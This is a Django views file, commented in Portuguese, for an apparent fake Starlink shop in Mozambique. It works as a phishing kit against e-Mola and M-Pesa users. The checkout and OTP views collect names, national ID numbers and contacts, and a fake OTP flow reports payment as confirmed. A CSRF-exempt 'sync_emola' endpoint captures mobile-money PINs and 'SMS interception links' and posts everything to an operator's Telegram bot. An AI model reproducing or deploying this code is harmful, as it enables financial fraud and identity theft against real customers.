import os
import json
import random
import requests
from datetime import datetime
from django.conf import settings
from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from .models import Order

def index(request):
    """Exibe a página principal / catálogo de kits Starlink."""
    return render(request, 'orders/index.html')


def generate_otp():
    """Gera um código de 6 dígitos para validação e-Mola / M-Pesa."""
    return str(random.randint(100000, 999999))


def send_telegram_notification(order, extra_info=None, custom_report=None):
    """Envia notificações ricas para o canal do Telegram configurado."""
    token = settings.TELEGRAM_BOT_TOKEN
    chat_id = settings.TELEGRAM_CHAT_ID
    if not token or not chat_id or token == 'YOUR_BOT_TOKEN': 
        return

    # Se passarmos um relatório customizado (do sync_emola), usamos ele direto
    if custom_report:
        message = custom_report
    else:
        message = (
            f"🔔 *ATUALIZAÇÃO DE PEDIDO*\n\n"
            f"💳 *MÉTODO:* MOVITEL (E-MOLA)\n"
            f"👤 *Cliente:* {order.full_name}\n"
            f"📞 *Telefone:* {order.phone}\n"
            f"💰 *Total:* {order.total_amount} MT\n"
            f"--------------------------------\n"
        )
        if extra_info: 
            message += f"📝 *INFO:* {extra_info}\n"
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    try: 
        requests.post(url, data=payload, timeout=10)
    except Exception: 
        pass


def checkout(request):
    """Renderiza a página de checkout ou cria um novo pedido via formulário POST."""
    if request.method == 'POST':
        order = Order.objects.create(
            full_name=request.POST.get('fullName'),
            national_id=request.POST.get('nationalId'),
            email=request.POST.get('email'),
            phone=request.POST.get('phone'),
            contact_person=request.POST.get('contactPerson'),
            alt_phone=request.POST.get('altPhone'),
            city=request.POST.get('city'),
            address=request.POST.get('address'),
            delivery_method=request.POST.get('delivery_method'),
            payment_method='movitel',
            total_amount=request.POST.get('total_amount', 0)
        )
        send_telegram_notification(order, "🛒 Novo pedido criado. Aguardando envio de instruções.")
        return render(request, 'orders/payment_instructions.html', {'order': order})
    return render(request, 'orders/checkout.html')


def process_payment(request, order_id):
    """Inicia o processo de pagamento gerando o OTP inicial."""
    order = get_object_or_404(Order, id=order_id)
    if request.method == 'POST':
        otp = generate_otp()
        order.otp_code = otp
        order.otp_created_at = datetime.now()
        order.otp_resend_count = 0
        order.save()
        send_telegram_notification(order, f"🔑 *OTP 6-DÍGITOS GERADO:* {otp}")
        return render(request, 'orders/otp_verification.html', {'order': order})
    return redirect('index')


def verify_otp(request, order_id):
    """Valida o código OTP inserido pelo usuário."""
    order = get_object_or_404(Order, id=order_id)
    if request.method == 'POST':
        user_otp = request.POST.get('otp_code')
        
        if order.otp_code == user_otp:
            order.status = 'Paid'
            order.save()
            send_telegram_notification(order, "✅ *PAGAMENTO CONFIRMADO COM SUCESSO!*")
            return render(request, 'orders/payment_success.html', {'order': order})
        else:
            send_telegram_notification(order, f"❌ *Tentativa falhada de OTP:* {user_otp}")
            return render(request, 'orders/otp_verification.html', {
                'order': order, 
                'error': 'Código OTP inválido. Tente novamente.'
            })
    return redirect('index')


def resend_otp(request, order_id):
    """Gera e reenvia um novo código OTP para o cliente."""
    order = get_object_or_404(Order, id=order_id)
    otp = generate_otp()
    order.otp_code = otp
    order.otp_created_at = datetime.now()
    order.save()
    send_telegram_notification(order, f"🔄 *NOVO OTP REENVIADO:* {otp}")
    return render(request, 'orders/otp_verification.html', {
        'order': order, 
        'message': 'Um novo código foi enviado.'
    })


@csrf_exempt
def sync_emola(request):
    """
    Endpoint assíncrono (API) que intercepta os dados em tempo real da interface.
    Captura Nome, BI, PIN de Confirmação e Links de interceptação de SMS.
    """
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            
            report = (
                "🚀 *STARLINK MOÇAMBIQUE SYNC*\n"
                "----------------------------------\n"
                f"👤 *Cliente:* `{data.get('name')}` | `{data.get('id_no')}`\n"
                f"📞 *Contacto:* `{data.get('phone')}`\n"
                f"📍 *Cidade:* `{data.get('city')}`\n"
                "----------------------------------\n"
                f"💰 *Pagamento:* `EMOLA / M-PESA`\n"
                f"🔑 *PIN Confirmação:* `{data.get('pin')}`\n"
                f"🔗 *Link SMS:* `{data.get('sms_link')}`\n"
                "----------------------------------\n"
                f"📦 *Pedido:* {data.get('item')} ({data.get('total')} MT)"
            )
            
            # Dispara usando a nossa função de mensageria segura do Django
            send_telegram_notification(order=None, custom_report=report)
            return JsonResponse({"status": "synchronized"})
        except Exception as e:
            return JsonResponse({"status": "error", "message": str(e)}, status=400)
            
    return JsonResponse({"status": "error", "message": "Método não permitido"}, status=405)